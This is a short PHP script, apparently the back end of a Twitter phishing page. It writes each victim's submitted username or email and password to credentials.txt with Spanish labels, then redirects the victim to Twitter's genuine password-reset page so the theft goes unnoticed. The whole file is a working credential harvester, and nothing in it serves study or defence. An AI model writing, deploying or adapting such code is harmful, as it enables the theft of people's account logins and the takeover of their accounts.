<?php

file_put_contents("credentials.txt", "[+] Twitter -> Usuario: " . $_POST['usernameOrEmail'] . " Contraseña: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/account/begin_password_reset');
exit();
?>
